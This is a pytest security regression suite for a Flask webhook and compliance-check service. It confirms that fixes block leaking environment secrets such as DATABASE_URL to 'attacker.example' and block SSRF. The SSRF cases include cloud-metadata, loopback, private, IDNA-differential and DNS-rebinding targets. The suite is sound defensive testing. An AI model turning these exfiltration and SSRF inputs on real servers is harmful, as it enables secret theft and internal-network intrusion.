"""Webhook auth-token exfiltration and outbound-URL (SSRF) hardening.

Before the fix, any signed-in user could store ``auth_header_env="DATABASE_URL"``
on a webhook and have the server send that environment variable's value to an
attacker's URL as a Bearer token; and the compliance check and webhooks would
call loopback, private and cloud-metadata addresses and report whether the port
was open. These tests drive the real routes as two users in two organisations.
"""

from __future__ import annotations

import uuid

import pytest

pytestmark = pytest.mark.usefixtures("db_session")

SECRET_VALUE = "super-secret-database-url-value"


def _user(db_session, org, label):
    from app.models.user import Role, User

    role = Role.query.filter_by(name="Architect").first() or Role.query.first()
    u = User(
        email=f"{label}-{uuid.uuid4().hex[:8]}@example.test",
        first_name=label,
        organization_id=org.id,
        confirmed=True,
        role=role,
    )
    u.password = uuid.uuid4().hex
    db_session.add(u)
    db_session.flush()
    return u


def _solution(db_session, org, user):
    from app.models.solution_models import Solution

    s = Solution(
        name=f"Hook solution {uuid.uuid4().hex[:6]}",
        organization_id=org.id,
        created_by_id=user.id,
        governance_status="draft",
    )
    db_session.add(s)
    db_session.flush()
    return s


@pytest.fixture
def world(db_session, make_org, client, login_as):
    org_a, org_b = make_org("a"), make_org("b")
    user_a, user_b = _user(db_session, org_a, "alice"), _user(db_session, org_b, "bob")
    sol_a, sol_b = _solution(db_session, org_a, user_a), _solution(db_session, org_b, user_b)

    class W:
        pass

    w = W()
    w.org_a, w.user_a, w.sol_a = org_a, user_a, sol_a
    w.user_b, w.sol_b = user_b, sol_b

    def as_a():
        login_as(client, user_a)
        return client

    def as_b():
        login_as(client, user_b)
        return client

    w.as_a, w.as_b = as_a, as_b
    return w


@pytest.fixture
def production_like(monkeypatch):
    """Switch the guard to non-development behaviour and resolve names to a
    public address, so tests never touch the network."""
    import app.utils.ssrf_guard as guard

    monkeypatch.setattr(guard, "internal_targets_allowed", lambda: False)
    monkeypatch.setattr(
        guard.socket, "getaddrinfo",
        lambda host, port, *a, **k: [(2, 1, 6, "", ("93.184.216.34", port))],
    )
    # The stub answers for the host's own name too; do not let that count as
    # "the server's own address".
    monkeypatch.setattr(guard, "_local_interface_addresses", lambda: set())


def _spec(db_session, solution):
    from app.models.published_api_spec import PublishedAPISpec

    row = PublishedAPISpec(
        solution_id=solution.id, spec_type="openapi", spec_version="1.0.0",
        spec_content={"openapi": "3.0.0", "paths": {"/a": {"get": {}}}},
        status="published",
    )
    db_session.add(row)
    db_session.flush()
    return row


@pytest.fixture
def http_calls(monkeypatch):
    """Record outbound HTTP; never actually send."""
    import requests

    calls = []

    class Resp:
        status_code = 200

        def json(self):
            return {}

    def fake_post(url, **kw):
        calls.append({"url": url, **kw})
        return Resp()

    monkeypatch.setattr(requests, "post", fake_post)
    return calls


def _create(client, sol_id, **body):
    return client.post(f"/api/solutions/{sol_id}/webhooks", json=body)


# --- D-1: auth_header_env -------------------------------------------------------


@pytest.mark.parametrize("name", ["DATABASE_URL", "SECRET_KEY", "AWS_SECRET_ACCESS_KEY",
                                  "webhook_token_x", "WEBHOOK_TOKEN_", "WEBHOOK_TOKEN_a",
                                  "WEBHOOK_TOKEN_X\n", "PATH", 123, ["WEBHOOK_TOKEN_X"]])
def test_create_rejects_non_allow_listed_env_name(world, production_like, http_calls, monkeypatch, name):
    monkeypatch.setenv("DATABASE_URL", SECRET_VALUE)
    resp = _create(world.as_a(), world.sol_a.id, url="https://hooks.example.com/x",
                   auth_header_env=name)
    assert resp.status_code == 400, resp.get_json()
    from app.models.spec_webhook import SpecWebhook

    assert SpecWebhook.query.filter_by(solution_id=world.sol_a.id).count() == 0
    assert http_calls == []


def test_update_rejects_non_allow_listed_env_name(world, production_like, monkeypatch):
    c = world.as_a()
    ok = _create(c, world.sol_a.id, url="https://hooks.example.com/x")
    assert ok.status_code == 201, ok.get_json()
    wid = ok.get_json()["webhook"]["id"]
    bad = world.as_a().put(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}",
                           json={"auth_header_env": "DATABASE_URL"})
    assert bad.status_code == 400
    from app.models.spec_webhook import SpecWebhook

    assert SpecWebhook.query.get(wid).auth_header_env is None


def test_exfiltration_end_to_end_secret_never_sent(world, production_like, http_calls, monkeypatch):
    monkeypatch.setenv("DATABASE_URL", SECRET_VALUE)
    monkeypatch.setenv("SECRET_KEY", SECRET_VALUE)
    c = world.as_a()
    r = _create(c, world.sol_a.id, url="https://attacker.example/x", auth_header_env="DATABASE_URL")
    assert r.status_code == 400
    # Create clean, then try to switch to the secret's name.
    wid = _create(world.as_a(), world.sol_a.id, url="https://attacker.example/x").get_json()["webhook"]["id"]
    r = world.as_a().put(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}",
                         json={"auth_header_env": "SECRET_KEY"})
    assert r.status_code == 400
    world.as_a().post(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}/test")
    assert http_calls, "the clean webhook should have been fired"
    for call in http_calls:
        assert "Authorization" not in call["headers"]
        assert SECRET_VALUE not in repr(call)


def test_existing_row_with_bad_env_name_is_not_read_at_send_time(world, production_like, http_calls, monkeypatch):
    """A row stored before the fix must not be able to leak the variable."""
    from app import db
    from app.models.spec_webhook import SpecWebhook

    monkeypatch.setenv("DATABASE_URL", SECRET_VALUE)
    row = SpecWebhook(solution_id=world.sol_a.id, url="https://attacker.example/x",
                      auth_header_env="DATABASE_URL", event_types=["spec_changed"])
    db.session.add(row)
    db.session.flush()

    import os
    import types

    from app.modules.solutions_product.services import drift_remediation_service as svc

    reads = []
    real_get = os.environ.get

    class EnvSpy:
        def get(self, key, default=None):
            reads.append(key)
            return real_get(key, default)

    # Only the service module's view of "os" is replaced, not the process.
    monkeypatch.setattr(svc, "os", types.SimpleNamespace(environ=EnvSpy()))
    assert svc.DriftRemediationService()._fire_single_webhook(row, {"event": "t"}) in (True, False)
    assert "DATABASE_URL" not in reads, "the environment variable was read"
    for call in http_calls:
        assert "Authorization" not in call["headers"]
        assert SECRET_VALUE not in repr(call)


def test_allow_listed_token_name_still_works(world, production_like, http_calls, monkeypatch):
    monkeypatch.setenv("WEBHOOK_TOKEN_CRM", "tok-123")
    r = _create(world.as_a(), world.sol_a.id, url="https://hooks.example.com/x",
                auth_header_env="WEBHOOK_TOKEN_CRM")
    assert r.status_code == 201, r.get_json()
    wid = r.get_json()["webhook"]["id"]
    t = world.as_a().post(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}/test")
    assert t.get_json()["success"] is True
    assert len(http_calls) == 1
    assert http_calls[0]["headers"]["Authorization"] == "Bearer tok-123"
    assert http_calls[0]["allow_redirects"] is False


# --- D-2: internal and metadata targets ----------------------------------------

BAD_URLS = [
    "http://127.0.0.1:5432/",
    "http://localhost/x",
    "https://[::1]/x",
    "http://169.254.169.254/latest/meta-data/",
    "https://10.0.0.5/x",
    "https://192.168.1.10/x",
    "https://172.16.3.4/x",
    "https://[fd00::1]/x",
    "https://[fe80::1]/x",
    "https://0.0.0.0/x",
    "ftp://example.com/x",
    "https://user:pass@example.com/x",
]


@pytest.mark.parametrize("url", BAD_URLS)
def test_webhook_create_and_update_reject_internal_urls(world, production_like, url):
    r = _create(world.as_a(), world.sol_a.id, url=url)
    assert r.status_code == 400, (url, r.get_json())
    wid = _create(world.as_a(), world.sol_a.id, url="https://hooks.example.com/x").get_json()["webhook"]["id"]
    u = world.as_a().put(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}", json={"url": url})
    assert u.status_code == 400, (url, u.get_json())
    from app.models.spec_webhook import SpecWebhook

    assert SpecWebhook.query.get(wid).url == "https://hooks.example.com/x"


def test_hostname_resolving_to_internal_address_is_rejected(world, monkeypatch):
    import app.utils.ssrf_guard as guard

    monkeypatch.setattr(guard, "internal_targets_allowed", lambda: False)
    monkeypatch.setattr(guard.socket, "getaddrinfo",
                        lambda host, port, *a, **k: [(2, 1, 6, "", ("169.254.169.254", port))])
    r = _create(world.as_a(), world.sol_a.id, url="https://rebind.example.com/x")
    assert r.status_code == 400


@pytest.mark.parametrize("url", [BAD_URLS[0], BAD_URLS[1], BAD_URLS[3], BAD_URLS[4], BAD_URLS[7]])
def test_stored_internal_url_is_not_called_at_send_time(world, production_like, http_calls, url):
    from app import db
    from app.models.spec_webhook import SpecWebhook
    from app.modules.solutions_product.services.drift_remediation_service import DriftRemediationService

    row = SpecWebhook(solution_id=world.sol_a.id, url=url, event_types=["spec_changed"])
    db.session.add(row)
    db.session.flush()
    assert DriftRemediationService()._fire_single_webhook(row, {"event": "t"}) is False
    assert http_calls == []


def test_external_https_webhook_still_works(world, production_like, http_calls):
    r = _create(world.as_a(), world.sol_a.id, url="https://hooks.example.com/x")
    assert r.status_code == 201
    wid = r.get_json()["webhook"]["id"]
    t = world.as_a().post(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}/test")
    assert t.get_json()["status"] == "delivered"
    assert http_calls[0]["url"] == "https://hooks.example.com/x"


def test_localhost_webhook_still_allowed_in_testing_config(world, http_calls):
    r = _create(world.as_a(), world.sol_a.id, url="http://localhost:9000/hook")
    assert r.status_code == 201


@pytest.mark.parametrize("url", BAD_URLS[:10])
def test_compliance_check_rejects_internal_service_url(world, db_session, production_like, monkeypatch, url):
    import requests

    spec = _spec(db_session, world.sol_a)

    sent = []
    monkeypatch.setattr(requests, "get", lambda *a, **k: sent.append(a) or None)
    monkeypatch.setattr(requests, "request", lambda *a, **k: sent.append(a) or None)
    r = world.as_a().post(f"/api/solutions/{world.sol_a.id}/compliance/check",
                          json={"service_url": url, "spec_id": spec.id})
    assert r.status_code == 400, (url, r.get_json())
    assert "refused" in r.get_json()["error"]
    assert sent == []


def test_checker_refuses_internal_url_even_when_called_directly(world, db_session, production_like, monkeypatch):
    """Scheduled checks reach ComplianceChecker without the route."""
    import requests
    from app.modules.solutions_product.services.compliance_checker import ComplianceChecker

    sent = []
    monkeypatch.setattr(requests, "get", lambda *a, **k: sent.append(a))
    spec = _spec(db_session, world.sol_a)
    out = ComplianceChecker().check(published_spec_id=spec.id, service_url="http://169.254.169.254")
    assert out["success"] is False and sent == []
    assert "refused" in out["error"]


# --- timeout clamp (A-4) --------------------------------------------------------


@pytest.mark.parametrize("raw,expected", [(0, 1), (-5, 1), (1, 1), (7, 7), (30, 30),
                                          (9999, 30), ("12", 12), (2.9, 2), (None, 10)])
def test_timeout_is_clamped(raw, expected):
    from app.utils.ssrf_guard import clamp_timeout

    assert clamp_timeout(raw) == expected


@pytest.mark.parametrize("raw", ["abc", [], {}, True, float("nan"), float("inf")])
def test_timeout_non_numeric_rejected(raw):
    from app.utils.ssrf_guard import clamp_timeout

    with pytest.raises(ValueError):
        clamp_timeout(raw)


def test_compliance_check_route_400_on_non_numeric_timeout(world):
    r = world.as_a().post(f"/api/solutions/{world.sol_a.id}/compliance/check",
                          json={"service_url": "https://hooks.example.com", "timeout": "abc"})
    assert r.status_code == 400


def test_compliance_check_route_passes_clamped_timeout(world, db_session, production_like, monkeypatch):
    from app.modules.solutions_product.services import compliance_checker as cc

    seen = {}

    def fake_check(self, published_spec_id, service_url, timeout=10, checked_by_id=None):
        seen["timeout"] = timeout
        return {"success": True}

    spec = _spec(db_session, world.sol_a)
    monkeypatch.setattr(cc.ComplianceChecker, "check", fake_check)
    r = world.as_a().post(f"/api/solutions/{world.sol_a.id}/compliance/check",
                          json={"service_url": "https://hooks.example.com", "timeout": 99999,
                                "spec_id": spec.id})
    assert r.status_code == 200
    assert seen["timeout"] == 30


# --- review round: guard bypasses and hygiene ------------------------------------


def test_non_ascii_host_is_refused_idna_differential(monkeypatch):
    """getaddrinfo (IDNA 2003) maps the sharp-s host to 'fass'; requests (IDNA
    2008) asks for 'xn--fa-hia'. Validate-then-request must not see two hosts."""
    import app.utils.ssrf_guard as guard

    def stub(host, port, *a, **k):
        ip = "169.254.169.254" if host.startswith("xn--") else "93.184.216.34"
        return [(2, 1, 6, "", (ip, port))]

    monkeypatch.setattr(guard.socket, "getaddrinfo", stub)
    monkeypatch.setattr(guard, "_local_interface_addresses", lambda: set())
    with pytest.raises(guard.BlockedOutboundURL):
        guard.validate_outbound_url("https://fa\u00df.attacker.example/x", require_https=False)
    # The ASCII form is judged on what it really resolves to.
    with pytest.raises(guard.BlockedOutboundURL):
        guard.validate_outbound_url("https://xn--fa-hia.attacker.example/x", require_https=False)
    assert guard.validate_outbound_url("https://fass.attacker.example/x", require_https=False)


def test_non_ascii_webhook_url_rejected_by_route(world, production_like):
    r = _create(world.as_a(), world.sol_a.id, url="https://fa\u00df.attacker.example/x")
    assert r.status_code == 400


@pytest.mark.parametrize("addr", ["100.64.0.1", "100.127.255.254", "::ffff:127.0.0.1",
                                  "::ffff:169.254.169.254"])
def test_cgnat_and_mapped_addresses_blocked(addr, monkeypatch):
    import app.utils.ssrf_guard as guard

    monkeypatch.setattr(guard, "_local_interface_addresses", lambda: set())
    assert guard._is_public_ip(addr) is False


def test_host_own_interface_address_blocked(monkeypatch):
    import app.utils.ssrf_guard as guard

    monkeypatch.setattr(guard, "_local_interface_addresses", lambda: {"93.184.216.34"})
    assert guard._is_public_ip("93.184.216.34") is False
    monkeypatch.setattr(guard, "_local_interface_addresses", lambda: set())
    assert guard._is_public_ip("93.184.216.34") is True


def test_configured_deny_list_blocks_cidr(app, monkeypatch):
    import app.utils.ssrf_guard as guard

    monkeypatch.setattr(guard, "_local_interface_addresses", lambda: set())
    monkeypatch.setitem(app.config, "SSRF_BLOCKED_CIDRS", ["93.184.216.0/24"])
    with app.test_request_context("/"):
        assert guard._is_public_ip("93.184.216.34") is False
        assert guard._is_public_ip("8.8.8.8") is True


@pytest.mark.parametrize("url", ["http://[::1/x", "https://h.example:99999/", "http://h.example:abc/"])
def test_malformed_urls_get_400_not_500(world, production_like, url):
    r = _create(world.as_a(), world.sol_a.id, url=url)
    assert r.status_code == 400
    wid = _create(world.as_a(), world.sol_a.id, url="https://hooks.example.com/x").get_json()["webhook"]["id"]
    u = world.as_a().put(f"/api/solutions/{world.sol_a.id}/webhooks/{wid}", json={"url": url})
    assert u.status_code == 400


def test_malformed_stored_url_is_skipped_at_send_time(world, production_like, http_calls):
    from app import db
    from app.models.spec_webhook import SpecWebhook
    from app.modules.solutions_product.services.drift_remediation_service import DriftRemediationService

    row = SpecWebhook(solution_id=world.sol_a.id, url="http://[::1/x", event_types=["spec_changed"])
    db.session.add(row)
    db.session.flush()
    assert DriftRemediationService()._fire_single_webhook(row, {"event": "t"}) is False
    assert http_calls == []


def test_refusal_message_is_generic(world, production_like, monkeypatch):
    import app.utils.ssrf_guard as guard

    monkeypatch.setattr(guard.socket, "getaddrinfo",
                        lambda host, port, *a, **k: [(2, 1, 6, "", ("10.1.2.3", port))])
    r = _create(world.as_a(), world.sol_a.id, url="https://internal.example.com/x")
    assert r.status_code == 400
    body = r.get_data(as_text=True)
    assert "10.1.2.3" not in body and "resolve" not in body.lower()


def test_internal_switch_follows_explicit_config_and_production_denies(app, monkeypatch):
    import app.utils.ssrf_guard as guard
    from config import Config, DevelopmentConfig, ProductionConfig, TestingConfig

    assert Config.ALLOW_INTERNAL_WEBHOOK_TARGETS is False
    assert ProductionConfig.ALLOW_INTERNAL_WEBHOOK_TARGETS is False
    assert DevelopmentConfig.ALLOW_INTERNAL_WEBHOOK_TARGETS is True
    assert TestingConfig.ALLOW_INTERNAL_WEBHOOK_TARGETS is True
    monkeypatch.setitem(app.config, "ALLOW_INTERNAL_WEBHOOK_TARGETS", False)
    # Neither TESTING, DEBUG nor FLASK_ENV can re-enable it.
    monkeypatch.setitem(app.config, "TESTING", True)
    monkeypatch.setenv("FLASK_ENV", "development")
    with app.app_context():
        assert guard.internal_targets_allowed() is False
        with pytest.raises(guard.BlockedOutboundURL):
            guard.validate_user_supplied_url("http://127.0.0.1/x")
